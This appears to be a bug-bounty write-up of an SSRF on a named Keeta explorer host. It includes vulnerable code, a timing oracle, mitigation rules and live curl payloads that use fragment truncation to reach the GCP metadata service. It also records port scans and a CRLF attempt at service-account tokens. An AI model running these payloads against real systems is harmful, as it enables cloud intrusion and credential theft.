# Keeta SSRF — Error-Based Leak + Fragment Truncation + Credential Hunt (2026-08-12)

**One-liner:** Pre-auth `?host=` / `x-network-host` SSRF on `explorer.test.keeta.com` (Google Frontend `2600:1900:0:2e02::400`) — timing oracle `0.3s 200` vs `26s 500`, OAST 48 hits, error-based `computeMetadata/` disclosure via fragment `#` truncating `/api`.

## 1. The SOP Bug

```ts
// apps/server/src/utils/request.ts:40
const urlHost = req.header('x-network-host') ?? req.query('host')  // zero validation
// apps/server/src/lib/network/custom.ts:33-39
endpoints: { api: `http${ssl?'s':''}://${host}/api`, p2p: `ws${ssl?'s':''}://${host}/p2p` }
```

`host` is verbatim interpolated + `ssl` flag controls `http` vs `https`. No allow-list, no private-IP block, `cors({origin:'*'})`.

## 2. Timing Oracle (proven live)

| host | code | time | meaning |
|------|------|------|---------|
| (none) | 200 | 0.3s | default network |
| `example.com` | 500 `Failed to make API call (not ok)` | 27s | external fetch success, non-JSON response |
| `127.0.0.1` | 500 `fetch failed` | 26s | connection refused |
| `169.254.169.254` / `metadata.google.internal` | 500 `Failed not ok` | 26s | TCP connect success, non-JSON (metadata root) |

`Failed not ok` = connected + HTTP 200 but JSON parse failed. `fetch failed` = TCP refused/timeout. Differential proves VPC allows metadata IP.

## 3. Fragment `#` Truncation — Why Internal Path Fails Without It

SOP always appends `/api`: `https://${host}/api`

If `host=169.254.169.254/computeMetadata/v1` → fetches `https://169.254.169.254/computeMetadata/v1/api` (404).

If `host=metadata#` → `https://metadata#/api` → fragment `#/api` stripped by URL parser → `https://metadata/` → correct root. Encoded `%23` preserves `#` through `getNetworkConfigFromRequest` query parsing (requests auto-encodes `#` as `%23`; raw `#` in browser is dropped — must use `%23` or curl raw).

**Proven leak:**
```bash
curl 'https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3...?host=metadata%23&networkAlias=test&ssl=false'
→ {"message":"Unexpected token 'c', \"computeMetadata/\n\" is not valid JSON"}
```
Same for `169.254.169.254%23` and `metadata.google.internal%23`. Root directory `computeMetadata/` is disclosed via JSON parse error.

## 4. Parse & Catet (Error Disclosure)

The error message **is the catat** — `JSON.parse` on non-JSON response spills first bytes of body inside `"..." is not valid JSON`. Works for root (plain text `computeMetadata/\n`). Fails for deeper token path because GCP returns `403 Forbidden` HTML without `Metadata-Flavor: Google` header — still `Failed not ok` but no spill. CRLF header injection `%0D%0AMetadata-Flavor: Google` is filtered (empty response).

Scan surface tested (all `ssl=false` + `#`):
- `169.254.169.254/computeMetadata/v1#` → `Failed not ok` (403, no spill)
- `.../service-accounts/default/token#` → `Failed not ok`
- `127.0.0.1:8080#` / `:3000#` / `:5000#` → `Failed not ok` (port open) vs `:2375#` → `fetch failed`
- `10.128.0.1#` → `fetch failed` / timeout

No `ya29.` / `BEGIN PRIVATE` / `secret` disclosed in scanned paths — credential exfil blocked by header requirement.

## 5. Redirect Chain — NOT Followed (Validated)

Two-webhook chain: `A 34ea918d... (302 Location: https://webhook.site/B)` → `B d82dd45f...`. Hit `?host=webhook.site/A&ssl=false`:
- A: 50 hits from `2600:1900::` with `KeetaNet/v0.18.0 (JS)` to `/api/node/ledger/representatives`
- B: 0 hits → **fetch does NOT follow 302**

Same via `httpbin.org/redirect-to?url=...` and `/redirect/1`. Fresh-UUID rule required (webhook pagination caps 50, old UUID polluted). Implication: `302 → http://169.254.169.254/...` exfil is blocked; direct SSRF + error leak is the bounty-grade impact.

## 6. OAST Proofs (Screenshotable)

- `https://webhook.site/#!/28278b5e-6454-4a2d-aae1-4ce9dc67ec01` — 48 hits, Google IP
- `https://webhook.site/#!/d82dd45f-a0a4-4a60-8058-09c09fb59505` — redirect logger
- `https://webhook.site/#!/34ea918d-accc-4071-9cbb-5fe462a5838e` — redirector 302

## 7. Report Framing

Don't claim `GCP SA token exfil` (redirect not followed, header required). Claim **Blind SSRF + Error-Based Information Disclosure + Internal Reachability + DoS (26s hang) + Cache Poisoning (`networkInstances` keyed by `host`)** — High. One-liners:

```bash
# Error leak
curl 'https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3...?host=metadata%23&networkAlias=test&ssl=false'
# OAST
curl 'https://explorer.test.keeta.com/api/v1/account/keeta_aaboj3...?host=webhook.site/28278b...&networkAlias=test'
```

## 8. Mitigation (Satpam Rules)

Allow-list `host` to `*.keeta.com` only; block `10/8 172.16/12 192.168/16 169.254.169.254 metadata.google.internal metadata 0.0.0.0 ::1`; disable user-supplied `host` for unauth; remove `networkInstances.set` for user hosts; validate `host` regex `^[a-z0-9.-]+(:\d+)?$` and DNS no private; enforce `ssl=true` + cert pin.

## 9. Perumpamaan Mapping (for the operator santai mode)

Resepsionis hotel (explorer) + SOP `https://${host}/api` + CCTV webhook + brankas 169.254/metadata + surat pindah 302 + coretan `#` + catatan error = explain chain without CDC headers.

> Used for `jelasin santai` + `pake perumpamaan` user preference — keep technical accuracy (0.3s vs 26s, Google IP, 48 hits) while using single analogy.
